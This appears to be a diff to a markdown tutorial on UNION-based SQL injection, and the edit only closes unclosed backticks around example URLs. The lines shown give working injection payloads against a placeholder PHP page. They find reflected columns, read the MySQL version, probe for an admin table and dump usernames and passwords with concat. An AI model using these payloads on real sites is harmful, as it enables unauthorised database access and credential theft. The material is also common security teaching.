@@ -61,7 +61,7 @@ it's in the form of executing some querys in the database and getting acces to i
 
 2. now, if we see some numbers in the page like `1 or 2 or 3 or 4 ==` then the UNION function work
 	
-	a. if it not work we try to change the `/*` to `--` so we have this `http://www.website.com/articles.php?id=3 union all select 1,2,3,4--
+	a. if it not work we try to change the `/*` to `--` so we have this `http://www.website.com/articles.php?id=3 union all select 1,2,3,4--`
 
 5. after checking the UNION function and it works good we try to get SQL version
 
@@ -72,7 +72,7 @@ we say in example that this number is 3
 
 1. so we replace 3 with @@version or version()
 
-	a. `http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*``
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*`
 
 2. and now we have the version in the screen!
 
@@ -86,13 +86,13 @@ if the MySQL Version is < 5 (i.e 4.1.33, 4.1.12...)
 
 1. lets see that the table admin exist!
 
- a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4,5 from admin/*``
+ a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4,5 from admin/*`
 
 2. and here we see the number 3 that we had in the screen now, we knows that the table admin exists
 
 3. here we had to check column names:
 
-	a. `http://www.website.com/articles.php?id=3 union all select 1,2,username,4,5 from admin/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,username,4,5 from admin/*`
 
 4. if we get an error we have to try another column name, and if it work we get username displayed on screen (example: admin,moderator,super moderator...)
 
@@ -102,7 +102,7 @@ if the MySQL Version is < 5 (i.e 4.1.33, 4.1.12...)
 
 6. and oups! we see password on the screen in a hash or a text, now we have to use 0x3a for having the informations like that username:password ,dmin:unhash...
 
-	a. `http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*
+	a. `http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*`
 
 7. this is the sample SQL Injection , now, we will go to the blind sql injection (more difficult)
 
